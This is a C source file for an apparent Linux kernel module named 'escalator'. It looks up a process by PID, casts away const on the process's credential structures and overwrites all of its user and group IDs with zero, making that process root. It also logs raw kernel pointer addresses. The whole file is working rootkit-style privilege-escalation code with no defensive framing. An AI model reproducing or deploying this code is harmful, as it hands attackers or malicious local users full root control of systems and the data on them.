#include "escalate.h"

static void escalate(int pid) {

    printk(KERN_INFO "escalator: Escalation triggered");

    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve task_struct");
        return;
    }

    // Cast away const. We can do this because we are the kernel and we need to, to change the contents
    credentials = (struct cred*) task->cred;
    if (credentials == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve cred");
        return;
    }

    // Cast away const. Same as above
    real_credentials = (struct cred*) task->real_cred;
    if (real_credentials == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve cred");
        return;
    }

    printk(KERN_INFO "escalator: PID: %d, cred: 0x%px, real_cred: 0x%px", task->pid, credentials, real_credentials);
    printk(KERN_INFO "escalator: UID: %d", credentials->uid.val);
    printk(KERN_INFO "escalator: SUID: %d", credentials->suid.val);
    printk(KERN_INFO "escalator: EUID: %d", credentials->euid.val);
    printk(KERN_INFO "escalator: FSUID: %d", credentials->fsuid.val);

    if (real_credentials == credentials) {
        printk(KERN_INFO "escalator: cred == real_cred, patching once");

        patch_credentials(credentials);
    } else {

        printk(KERN_INFO "escalator: cred != real_cred, patching both");

        patch_credentials(credentials);
        patch_credentials(real_credentials);
    }

    printk(KERN_INFO "escalator: escalated %d to root", task->pid);
}

static void patch_credentials(struct cred* credentials) {
    credentials->uid.val = 0;
    credentials->suid.val = 0;
    credentials->euid.val = 0;
    credentials->fsuid.val = 0;

    credentials->gid.val = 0;
    credentials->sgid.val = 0;
    credentials->egid.val = 0;
    credentials->fsgid.val = 0;
}